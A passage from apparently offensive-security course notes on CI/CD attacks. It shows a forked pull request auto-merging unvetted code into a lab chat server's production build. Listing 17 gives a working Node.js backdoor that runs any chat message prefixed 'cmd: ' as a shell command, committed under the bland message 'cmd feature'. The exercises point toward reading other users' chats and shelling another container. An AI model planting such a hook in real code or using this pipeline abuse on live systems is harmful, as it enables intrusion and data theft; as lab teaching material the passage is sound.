remote:   http://git.offseclab.io/Adis_Zvekic/chat-server/compare/master...offsec:master
remote: 
remote: . Processing 1 references
remote: Processed 1 references in total
To http://git.offseclab.io/offsec/chat-server.git
   44df955..2543a89  master -> master
```

> Listing 15 - Committing and Pushing the Changes to Our Fork

Conveniently, Gitea provides us with a link to create a pull request. Let's follow that link and test it out.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/529cdd4aaf4a1c371a94049013df6510_MD5.jpg]]

Figure 16: Creating New Pull Request

Let's click the _New Pull Request_ button.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/d0b2b70a6180bbc2297ddb41615b2542_MD5.jpg]]

Figure 17: Submitting Pull Request

We now have the space to add a description for our change. The title is pre-populated with our commit message. We won't make any other changes, but we'll click _Create Pull Request_.

Once we do that, we can refresh the page after a few seconds, and we'll find that the build has started.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/8170d66fa0501448609a25448f535d71_MD5.jpg]]

Figure 18: Awaiting Build

After a few minutes, we'll find that the build succeeded and that the change was merged. At this point, we can confirm that this environment is vulnerable to the CICD-SEC-1: Insufficient Flow Control Mechanisms risk.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/f6328db31c84a2dca678ac9ae37756bb_MD5.jpg]]

Figure 19: Completed Build

Now that we know the changes have been merged, we can assume that the change will be propagated to production. However, we have no way of viewing the progress for that since it won't show in this pull request. Instead, we'll wait several more minutes and try to create a chat room with multiple users.

We'll create a chat room called "test" with a user called "test". Then, in a new tab, we'll join the "test" room with a user named "test2" and return to our original tab.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/e5f59947f19c5c8ff3cc01ef8a4a6fdf_MD5.jpg]]

Figure 20: Propagated to Production

Excellent! We find that our new message was added to production! Since we're able to add code, we can confirm the existence of the CICD-SEC-9: Improper Artifact Integrity Validation risk. Now, we just need to find a way to obtain code execution.

## 4.4.2. Obtaining Shell in Production

Now that we know we can send custom code into production, let's make a change that will let us execute commands against the production chat-server application. There are several ways that we can do this:

1. We can include a reverse shell each time the application starts. However, this is limited because if the shell dies, we have to wait until the application restarts to get a shell again.
2. We can create a new route that will accept a _GET_ or _POST_ method that will execute any command we provide it. This is easy to build on with additional scripts and automated exploits for a fully interactive shell. However, we know that the chat-server is behind a reverse proxy, and without a significant amount of research, we don't know which additional routes might point to the chat-server application.
3. We can create a secret prefix in chat messages that will execute a command when provided. This allows us to execute commands and restart a shell if it crashes. However, since it uses WebSockets, it's harder to build additional automation around it than using the route option.

For this exploit, we'll choose the third option. While it might be harder to interact with the shell using scripts, it's not impossible (and out of scope for this Module in any case).

Since we created a pull request already that was merged into the **master** branch, our fork is out of sync with the **master** branch. We could update our fork but it's easier to delete our fork and create a new one that's up-to-date. To delete the fork, we'll navigate to the _Settings_ tab, scroll to the bottom, and click the _Delete This Repository_ button.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/b1411d7a21b17a8bf9f5b6341b51130e_MD5.jpg]]

Figure 21: Delete Fork

This will open a confirmation where we have to type in the repo name (**chat-server**) and click _Delete Repository_.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/7e4b92cb90d295f443d50dda8fc62965_MD5.jpg]]

Figure 22: Delete Fork - Confirmation

Now that the repository is deleted, let's return to the _Adis_Zvekic/chat-server_ repository and create a new fork. We'll **cd** back to the **home** directory, **rm** the existing folder, **git clone** the updated fork, and **cd** into it.

```
kali@kali:~/chat-server$ cd ..

kali@kali:~$ rm -rf chat-server

kali@kali:~$ git clone http://git.offseclab.io/offsec/chat-server.git
Cloning into 'chat-server'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 17 (delta 4), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (17/17), 19.29 KiB | 282.00 KiB/s, done.
Resolving deltas: 100% (4/4), done.

kali@kali:~$ cd chat-server
```

> Listing 16 - Removing Old chat-server Repo and Cloning the New One

Next, we need to make the change to **index.js** that will contain our custom execution code. Let's add our new code after line 47. We'll explain this code below.

```
kali@kali:~/chat-server$ nano index.js 

kali@kali:~/chat-server$ cat -n index.js
...
45      socket.on('NEW_MESSAGE', (message, callback) => {
46          const user = getUser(socket.id);
47          if (message.includes("cmd: ")){
48            const { exec } = require('child_process');
49            cmd = message.replace("cmd: ", "")
50            exec(cmd, (error, stdout, stderr) => {
51              if (error) {
52                io.to(user.room).emit('MESSAGE', { user: user.name, text: "ERROR: " + error.message});
53              }else{
54                io.to(user.room).emit('MESSAGE', { user: user.name, text: "OUTPUT: " + stdout});
55              }
56            });
57          }
58          io.to(user.room).emit('MESSAGE', { user: user.name, text: message });
59          //io.to(user.room).emit('ROOM_DATA', { room: user.room, users: getAllUsersInRoom(user.room)});
60
61          callback();
62      })
63
...
```

> Listing 17 - Editing index.js File to Insert Our Custom Code

On line 47, we add an _if_ statement that will check if the incoming message contains our unique prefix. For this, we chose "cmd: " as the prefix. If the message contains the prefix, we'll import the library for executing system commands on line 48.

On line 49, we'll remove the prefix from the message, leaving only the command to execute.

On line 50, we'll execute the command using the imported library. If the command resulted in an error, we'll emit a new message with the error on line 52. If the execution did not contain an error, we'll emit a new message with the output of the command on line 54.

We'll leave the rest of the **index.js** file the same.

Next, we'll add the changes, commit them, and push the changes up to our fork.

```
kali@kali:~/chat-server$ git add * 

kali@kali:~/chat-server$ git commit -m "cmd feature"                        
[master 2a1356b] cmd feature
 1 file changed, 11 insertions(+)

kali@kali:~/chat-server$ git push
Username for 'http://git.offseclab.io': offsec
Password for 'http://offsec@git.offseclab.io': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 5 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 480 bytes | 480.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
remote: 
remote: Create a new pull request for 'offsec:master':
remote:   http://git.offseclab.io/Adis_Zvekic/chat-server/compare/master...offsec:master
remote: 
remote: . Processing 1 references
remote: Processed 1 references in total
To http://git.offseclab.io/offsec/chat-server.git
   28676be..2a1356b  master -> master
```

> Listing 18 - Committing and Pushing the Changes to Our Fork

Once again, we'll follow the link Gitea provided for us to open a new pull request.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/096d41aaf537455cd625e1b912875a82_MD5.jpg]]

Figure 23: Open Pull Request

After several minutes, the pull request build should complete and the pull request will be merged in. A new build will then push the **master** branch into production. After several more minutes, we can go to the chat application and open a new chat room. We can now try to execute commands using the **cmd:** prefix. We'll start by executing the **whoami** command.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/75e74e3d00449e8dc9c808a65d455c8e_MD5.jpg]]

Figure 24: Test Changes - Command Execution

Excellent! We have command execution in production!

#### Labs

1. Use the command execution to obtain the flag in the **/proof.txt** file of the target.

Answer

2. Modify the payload to be able to read other user's conversations. One of the other users of the app will send a flag.

Answer

3. Modify the contents of the chat-client repository in order to obtain a shell in the chat-client container running in the infrastructure. The flag can be found in **/proof.txt**

Answer

## 4.5. Wrapping Up

In this Module, our target environment had multiple risks and vulnerabilities that led to exploitation of the production environment. By using proper [_identity and access management_](https://en.wikipedia.org/wiki/Identity_management) and artifact integrity validation, this environment would have been protected from the attack.

Now that we're done with the Module, we need to reset our personal Kali's DNS configuration.

## 4.5.1. Resetting Kali's DNS Configuration

In order to avoid issues with DNS in the future, we need to reset our personal Kali machine's DNS settings. To do this, we'll use **nmcli** with the **connection modify** subcommands to change our connection ("Wired connection 1" in our case) to have an empty **ipv4.dns** setting.

If you have a preferred DNS server you use, this would be the time to set that instead.

```
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns ""
                                                                             
kali@kali:~$ sudo systemctl restart NetworkManager  
```

> Listing 19 - Resetting the DNS Settings

We can ensure everything is working as expected by navigating to any public site in the web browser.